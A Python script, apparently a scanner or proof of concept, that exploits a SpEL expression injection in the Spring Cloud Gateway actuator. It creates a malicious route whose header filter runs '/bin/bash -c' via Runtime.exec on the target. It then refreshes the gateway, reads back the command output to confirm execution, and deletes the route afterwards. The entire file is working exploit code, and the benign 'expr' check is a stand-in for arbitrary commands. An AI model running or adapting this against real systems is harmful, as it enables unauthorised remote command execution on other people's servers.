import requests,re,urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def randomLowercase(n):
	key=""
	zf="qwertyuiopasdfghjklzxcvbnm"
	import random
	for _ in range(n):
		suiji1=random.randint(0,len(zf)-1)
		key+=zf[suiji1]
	return key
s1=randomLowercase(10)
def randomLowercase(n):
	key=""
	zf="qwertyuiopasdfghjklzxcvbnm"
	import random
	for _ in range(n):
		suiji1=random.randint(0,len(zf)-1)
		key+=zf[suiji1]
	return key
s2=randomLowercase(10)
def randomInt(s,e):
	import random
	key=random.randint(int(s),int(e))
	return key
i1=randomInt(800000000, 1000000000)
def randomInt(s,e):
	import random
	key=random.randint(int(s),int(e))
	return key
i2=randomInt(800000000, 1000000000)
def scan(baseurl):
	if baseurl[-1]=="/":
		baseurl=baseurl
	else:
		baseurl=baseurl+"/"
	url=baseurl+"actuator/gateway/routes/"+s1+""
	body='{"id": "'+s2+'","filters": [{"name": "AddResponseHeader","args": {"name": "Result","value": "#{new java.lang.String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\\"/bin/bash\\",\\"-c\\",\\"expr '+str(i1)+' + '+str(i2)+'\\"}).getInputStream()))}"}}],"uri": "http://example.com","order": 0}'
	headers={'Content-Type': 'application/json'}
	response=requests.post(url,body,headers=headers,timeout=5,verify=False)
	if response.status_code == 201 and "routes" in response.headers["Location"]:
		r0=True
	else:
		r0=False
	if baseurl[-1]=="/":
		baseurl=baseurl
	else:
		baseurl=baseurl+"/"
	url=baseurl+"actuator/gateway/refresh"
	headers={'Content-Type': 'application/x-www-form-urlencoded'}
	response=requests.post(url,body,headers=headers,timeout=5,verify=False)
	if response.status_code == 200:
		r1=True
	else:
		r1=False
	if baseurl[-1]=="/":
		baseurl=baseurl
	else:
		baseurl=baseurl+"/"
	url=baseurl+"actuator/gateway/routes/"+s1+""
	headers={'Content-Type': 'application/x-www-form-urlencoded'}
	response=requests.get(url,headers=headers,timeout=5,verify=False)
	if response.status_code == 200 and str(i1+i2) in response.text:
		r2=True
	else:
		r2=False
	if baseurl[-1]=="/":
		baseurl=baseurl
	else:
		baseurl=baseurl+"/"
	url=baseurl+"actuator/gateway/routes/"+s1+""
	headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0"}
	response=requests.delete(url,headers=headers,timeout=5,verify=False)
	if response.status_code == 200:
		r3=True
	else:
		r3=False
	if r0 and r1 and r2 and r3:
		return True
	else:
		return False
